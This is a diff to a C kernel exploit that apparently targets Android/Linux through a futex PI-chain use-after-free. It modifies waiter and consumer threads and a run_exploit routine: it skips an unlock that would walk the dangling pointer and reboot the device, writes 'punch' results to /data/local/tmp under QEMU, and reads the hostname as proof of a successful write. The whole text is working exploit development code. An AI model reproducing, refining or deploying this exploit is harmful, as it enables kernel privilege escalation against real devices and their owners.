@@ -203,7 +203,12 @@ void *waiter_thread(void *arg __attribute__((unused))) {
                         * reads stamped words, not the raw residue) */
     durable_stage("waiter_pselect_returned");
     atomic_store(&route_done, 1);
-    futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
+    /* TAIL unlock SKIPPED in selfstamp mode: the punch already happened;
+     * this unlock's deboost walk over the still-dangling pointer is the
+     * post-phase softboot (QEMU+device proven). The owner stays blocked
+     * — the process exits and the kernel cleans up. */
+    if (env_flag("SELFSTAMP_TAILUNLOCK", 0))
+      futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
     while (!atomic_load(&owner_chain_done)) usleep(1000);
     return NULL;
   }
@@ -282,6 +287,21 @@ void *consumer_thread(void *arg __attribute__((unused))) {
         long sched_ret = sched_setattr_tid(tid, consumer_nice);
         pr_info("consumer punch tid=%d sched_ret=%ld errno=%d\n", tid,
                 sched_ret, errno);
+        if (env_flag("QEMU_INIT", 0)) {
+          /* thread prints unreliable under QEMU TCG — durable file instead;
+           * the launcher polls and prints it. */
+          int pf = open("/data/local/tmp/punch",
+                        O_WRONLY | O_CREAT | O_APPEND | O_SYNC, 0644);
+          if (pf >= 0) {
+            char pb[128];
+            int pn = snprintf(pb, sizeof(pb),
+                              "punch tid=%d ret=%ld errno=%d\n",
+                              tid, sched_ret, errno);
+            if (pn > 0)
+              (void)write(pf, pb, (size_t)pn);
+            close(pf);
+          }
+        }
         if (env_flag("MODE4_CFI_ON_PUNCH", 0) || env_flag("MODE4_PROOF", 0)) {
           char buf[80];
           snprintf(buf, sizeof(buf), "post_setattr ret=%ld errno=%d", sched_ret,
@@ -950,6 +970,12 @@ int run_exploit(int argc, char **argv) {
       read_first_line("/proc/sys/kernel/random/boot_id", boot_after,
                       sizeof(boot_after));
       pr_success("QEMU_BOOTID=[%.40s]\n", boot_after);
+    }
+    {
+      char hn[80] = {0};
+      read_first_line("/proc/sys/kernel/hostname", hn, sizeof(hn));
+      pr_success("WP_HOSTNAME=[%.60s]\n", hn);
+      live_sync_log("WP", hn);
     }
     pr_success("WRITE_PROOF done landed=%d boot_wrote=%d enf_wrote=%d "
                "boot_after=%s enforce_after=%s success_calls "
